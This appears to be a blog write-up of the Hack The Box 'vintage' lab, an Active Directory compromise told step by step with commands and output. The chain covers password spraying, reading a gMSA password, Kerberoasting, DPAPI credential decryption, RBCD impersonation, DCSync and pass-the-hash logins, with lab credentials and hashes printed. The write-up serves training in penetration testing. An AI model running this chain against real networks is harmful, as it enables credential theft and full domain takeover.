---
layout: post
title: HTB - vintage
date: 2025-05-05 14:07 -0400
---

{{ 'vintage' | machine_img }}

## nmap
```bash
» sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,60870,60875,60893 -sC -sV $(cat ip.txt) --min-rate 1024
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-14 15:11 -04
Nmap scan report for dc01.vintage.htb (10.10.11.45)
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-14 19:15:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60870/tcp open  msrpc         Microsoft Windows RPC
60875/tcp open  msrpc         Microsoft Windows RPC
60893/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m59s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-02-14T19:16:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.27 seconds
```

## domains
dc01.vintage.htb
vintage.htb

Default windows ports, we have P.Rosa credentials to start.
- P.Rosa:Rosaisbest123

Start checking smb.
```bash
» netexec smb $(cat ip.txt) -u P.Rosa@vintage.htb -p Rosaisbest123
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa@vintage.htb:Rosaisbest123 STATUS_NOT_SUPPORTED
```

Looks like you need to use kerberos auth.
```bash
» netexec smb dc01.vintage.htb -u P.Rosa@vintage.htb -p Rosaisbest123 -k
```

Check bloodhound now.
```bash
bloodhound-ce-python -c All -u P.Rosa -p Rosaisbest123  --zip -d vintage.htb -ns $(cat ip.txt)
```

Make a list of users and try <user>:<user>. Important to lowercase everything and add or remove `$` at the end.
```bash
» netexec smb dc01.vintage.htb -u users.txt -p users.txt -k --no-brute --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01:fs01
```

Got a match for FS01. It's a computer. And it has ReadGMSAPassword over GMSA01$. Maybe I can just bloodyAD it?
```bash
» bloodyAD -k --host dc01.vintage.htb get object 'gmsa01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
```

So now we can login into gmsa01$ with pass the hash. And get access to 3 service accounts.
![gmsa 1](/assets/img/vintage3.png)
![gmsa 2](/assets/img/vintage4.png)


Can't change the passwords:
```bash
bloodyAD -k --host dc01.vintage.htb set password svc_sql 'asdf1234$Ba'
bloodyAD -k --host dc01.vintage.htb set password svc_ldap 'asdf1234$Ba'
bloodyAD -k --host dc01.vintage.htb set password svc_ark 'asdf1234$Ba'
```

Kerberoasting works though. First needs to activate the sql account.
```bash
bloodyAD -k --host dc01.vintage.htb remove uac svc_sql -f ACCOUNTDISABLE
targetedKerberoast.py -d vintage.htb --dc-host dc01.vintage.htb -k
```

Now we crack the hashes. Only one worked.
- svc_sql:Zer0the0ne

Try this password on every user. Works for c.neri.
```bash
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --no-brute --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne
```

c.neri has winrm access so its probably the user flag.
```bash
getTGT.py 'vintage.htb/c.neri:Zer0the0ne'
export KRB5CCNAME=./c.neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
*Evil-WinRM* PS C:\Users\C.Neri\Documents> type ..\Desktop\user.txt
33c3e***************************
```

On linux you need to edit the kerberos config at `/etc/krb5.conf`, so you can winrm:
```bash
[realms]
VINTAGE.HTB = {
  kdc = dc01.vintage.htb
  admin_server = dc01.vintage.htb
  default_domain = vintage.htb
}

[domain_realm]
.vintage.htb = VINTAGE.HTB
vintage.htb = VINTAGE.HTB
```

There is some saved credentials in 'C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6'. We can interact with it with dpapy.py from impacket.
```bash
dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
# Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```
- vintage\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312

c.neri_adm can add self to delegatedadmins. So we can execute something as someone else?
![delegate](/assets/img/vintage5.png)
![delegate](/assets/img/vintage6.png)

We can abuse RBCD, which is a security mechanism that limits which services can act on behalf of an user.

We need an account with `GenericWrite` over another and the other account needs to have a ServicePrincipalName set. For the full theory, prerequisites and edge cases: [theory](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

Here we can use `gmsa01$` to set `svc_sql` spn. Then we add `svc_sql` to DELEGATEDADMINS giving it access to delegation capabilities. Now we use `S4U2Self` and `S4U2Proxy`.

From what I could understand (probably incomplete):
- S4U2Self
  - gets a service ticket with the permissions of another user.
- S4U2Proxy
  - gets a service ticket for another service with the permissions of another user.

Putting it all together:
```bash
#!/usr/bin/env bash

# login as gmsa01
getTGT.py 'vintage.htb/gmsa01' -hashes aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178 -no-pass
export KRB5CCNAME=./gmsa01.ccache

# update the ticket
bloodyAD -k --host dc01.vintage.htb add groupMember servicemanagers 'gmsa01$'
getTGT.py 'vintage.htb/gmsa01' -hashes aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178 -no-pass

# setup svc_sql
bloodyAD -k --host dc01.vintage.htb remove uac "svc_sql" -f ACCOUNTDISABLE
bloodyAD -k --host dc01.vintage.htb set object "svc_sql" servicePrincipalName  -v "cifs/fake"
export KRB5CCNAME=

# add svc_sql to delegateadmins
getTGT.py 'vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312'
export KRB5CCNAME=./c.neri_adm.ccache
bloodyAD -k --host dc01.vintage.htb add groupMember "DELEGATEDADMINS" "svc_sql"
export KRB5CCNAME=

# impersonate l.bianchi_adm
getTGT.py vintage.htb/"svc_sql":Zer0the0ne
export KRB5CCNAME=./"svc_sql".ccache
getST.py -impersonate "l.bianchi_adm" -spn "cifs/dc01.vintage.htb" -k -no-pass -dc-ip "dc01.vintage.htb" "vintage.htb"/"svc_sql":"Zer0the0ne"
```

This gives a ticket to l.bianchi_adm, from here you can choose how you get admin, l.bianchi_adm can do whatever. With DCSync:
```bash
export KRB5CCNAME=./l.bianchi_adm.ccache
secretsdump.py -k dc01.vintage.htb -just-dc-user Administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
getTGT.py 'vintage.htb/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de -no-pass -k
export KRB5CCNAME=./Administrator.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

Admin gives an error when trying to login with winrm. Let's try with l.bianchi_adm.
```bash
export KRB5CCNAME=./l.bianchi_adm.ccache
secretsdump.py -k dc01.vintage.htb -just-dc-user l.bianchi_adm
# l.bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
getTGT.py 'vintage.htb/l.bianchi_adm' -hashes aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0 -no-pass -k
export KRB5CCNAME=./l.bianchi_adm.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
*Evil-WinRM* PS C:\Users\l.bianchi_adm\Documentype ..\..\Administrator\Desktop\root.txt
b57b2**************************
```
